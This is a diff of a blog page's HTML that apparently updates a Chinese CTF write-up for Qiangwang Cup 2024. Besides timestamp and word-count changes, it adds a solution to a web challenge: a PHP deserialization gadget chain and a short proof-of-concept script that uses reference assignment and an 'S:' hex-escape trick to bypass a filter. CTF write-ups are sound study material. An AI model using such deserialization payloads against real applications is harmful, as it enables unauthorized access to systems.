@@ -56,8 +56,9 @@
 <meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/%E5%9B%BE%E7%89%875.png">
 <meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-172056.png">
 <meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-172356.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241104-172208.png">
 <meta property="article:published_time" content="2024-11-02T01:31:08.000Z">
-<meta property="article:modified_time" content="2024-11-03T10:12:43.071Z">
+<meta property="article:modified_time" content="2024-11-04T11:37:23.239Z">
 <meta property="article:author" content="baozongwi">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -506,8 +507,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-11-03 18:12:43</span>
-            <span class="mobile">2024-11-03 18:12:43</span>
+            <span class="desktop">2024-11-04 19:37:23</span>
+            <span class="mobile">2024-11-04 19:37:23</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -545,12 +546,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>7.7k Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>7.9k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>41 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>42 Mins</span>
         </span>
     
     
@@ -792,7 +793,7 @@
                      data-src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-154417.png"
                       alt="1"
                 ></p>
-<p>这个我都不会看，长江大桥</p>
+<p>这个我都不用看，长江大桥</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -994,6 +995,22 @@
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user::destruct-&gt;guest::toString-&gt;user::invoke-&gt;guest::call</span><br></pre></td></tr></table></figure></div>
 
 <p>但是写了一下好像是打不通的</p>
+<hr>
+<p>看了朋友的wp同时和大家交流发现可以这么打通，首先，要求哪里不一定非要写脚本打，可以直接抓包拿到源码，拿到源码之后再次分析链子，发现还是不够会想，一般的反序列化头头都是destruct</p>
+<p>而这里是<code>get</code>，如何进入呢</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241104-172208.png"
+                      alt="1"
+                ></p>
+<p>那也就是我们只要被解析的最外面的类没有<code>password</code>就可以进入<code>get</code></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root::get-&gt;user::destruct</span><br></pre></td></tr></table></figure></div>
+
+<p>写个<code>poc</code></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">root</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">root</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="keyword">new</span> <span class="title function_ invoke__">user</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;username-&gt;username=<span class="string">&quot;2024qwb&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;value=&amp;<span class="variable">$a</span>-&gt;username-&gt;username;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;s:7:&quot;2024qwb&quot;&#x27;</span>,<span class="string">&#x27;S:7:&quot;2024\\71wb&quot;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>引用赋值两个值都会改变(<del>好久没用快忘了</del>)，记得换成<code>S</code>，不然无效，不清楚过程的可以调试一下</p>
 <h1 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h1><p>web题主要就是卡在了路由的地方，代审的题目呢，不是很简单，黑盒呢，测得非常难受，不过一有回显我就会非常激动哈哈，开心:happy:</p>
 
         </div>
@@ -1009,7 +1026,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-11-03 18:12:43
+                    :</strong> 2024-11-04 19:37:23
             </li>
         
         <li>
@@ -1170,7 +1187,7 @@
                     </span>
                     
                         <span>
-                            220k words in total
+                            220.2k words in total
                         </span>
                     
                 </p>
